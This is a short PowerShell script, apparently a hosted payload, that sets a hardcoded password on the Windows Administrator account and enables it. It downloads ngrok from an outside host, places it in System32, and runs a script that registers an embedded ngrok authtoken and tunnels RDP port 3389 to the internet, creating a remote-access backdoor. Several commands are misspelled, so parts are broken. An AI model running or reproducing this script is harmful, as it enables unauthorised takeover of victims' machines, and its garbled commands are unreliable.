Hosted File:
Set-LocalUser -Name "Administrator" -Password (CovertTo-SecureString -AsPlainText "78692666@Aaa" -Force)
Set-LocalUser -Name "Administrator" | Enable-LocalUser
Ivoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
tar xf ngrok.zip
Copy nfrok.exe C:\Windows\System32
cmd /c echo ./ngrock.exe authtoken "2EdGfaRE8FARQnGxwW3nOwgnnte_3nyxAth8Ee6A1JqFz2jeW" >a.ps1
cmd /c echo cmd /k strat ngrock.exe tcp 3389 >>a.ps1
cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
.\a.ps1
